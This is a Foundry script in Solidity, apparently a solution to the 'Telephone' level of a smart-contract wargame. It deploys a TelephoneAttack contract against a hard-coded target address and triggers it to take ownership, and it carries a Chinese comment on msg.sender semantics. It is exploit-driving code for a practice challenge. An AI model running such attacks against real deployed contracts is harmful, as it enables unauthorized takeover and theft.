// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/attacks/level04/Attack.sol";

contract TelephoneScript is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address targetAddr = 0xeC3A93a0e4008e152C77E75f0119114235B7A949;

        vm.startBroadcast(privateKey);
        TelephoneAttack attacker = new TelephoneAttack(targetAddr);
        attacker.attack(vm.addr(privateKey));
        //attacker.attack(msg.sender);即使在Broadcas的语义之下，此处msg.sender是Script合约地址，不是EOA地址。
        vm.stopBroadcast();
    }
}
